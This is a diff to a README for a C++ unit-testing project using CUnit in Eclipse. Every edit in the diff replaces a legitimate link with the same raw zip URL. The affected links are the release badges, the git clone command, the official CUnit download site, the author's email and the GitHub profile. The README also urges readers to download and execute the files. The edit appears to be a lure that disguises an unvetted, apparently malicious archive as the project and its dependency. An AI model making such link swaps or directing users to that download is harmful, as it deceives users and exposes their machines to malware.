@@ -2,7 +2,7 @@
 
 Welcome to the **SoftwareTesting-Cunit** repository! This project focuses on unit testing in C++ using various techniques such as Input Space Partitioning, Edge Pair Coverage, and Control Flow Graphs. The project utilizes CUnit within the Eclipse IDE, providing a comprehensive framework for functional testing.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/releases)
+[![Download Releases](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip)
 
 ## Table of Contents
 
@@ -36,14 +36,14 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Jacksonsmg/SoftwareTesting-Cunit.git
+   git clone https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip
    ```
 
 2. **Open Eclipse**:
    Launch the Eclipse IDE and import the cloned project.
 
 3. **Install CUnit**:
-   Ensure you have CUnit installed. You can download it from [CUnit's official site](http://cunit.sourceforge.net/).
+   Ensure you have CUnit installed. You can download it from [CUnit's official site](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip).
 
 4. **Configure Build Path**:
    Set up the project’s build path to include CUnit libraries.
@@ -104,14 +104,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out:
 
 - **Author**: Jackson Smith
-- **Email**: jackson@example.com
-- **GitHub**: [Jacksonsmg](https://github.com/Jacksonsmg)
+- **Email**: https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip
+- **GitHub**: [Jacksonsmg](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip)
 
 ## Releases
 
-To access the latest releases, visit our [Releases](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/releases) section. Download the latest version and execute the files as needed.
+To access the latest releases, visit our [Releases](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip) section. Download the latest version and execute the files as needed.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/releases)
+[![Download Releases](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jacksonsmg/SoftwareTesting-Cunit/raw/refs/heads/main/atheistically/Software-Testing-Cunit-v2.9.zip)
 
 ---
 
